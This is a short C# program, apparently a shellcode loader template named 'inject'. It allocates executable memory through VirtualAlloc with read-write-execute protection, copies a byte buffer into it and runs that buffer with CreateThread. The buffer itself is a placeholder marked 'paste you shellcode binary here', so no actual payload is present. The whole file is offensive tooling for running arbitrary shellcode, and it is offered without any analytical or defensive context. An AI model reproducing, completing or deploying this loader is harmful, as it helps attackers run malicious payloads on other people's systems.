using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
namespace inject
{
	class program
	{
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

		[DllImport("kernel32.dll")]
		static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
		static void Main(string[] args)
		{

			byte[] buf = {paste you shellcode binary here };
			int size = buf.Length;
			IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
			Marshal.Copy(buf, 0, addr, size);
			IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
			WaitForSingleObject(hThread, 0xFFFFFFFF);







		}

	}
}


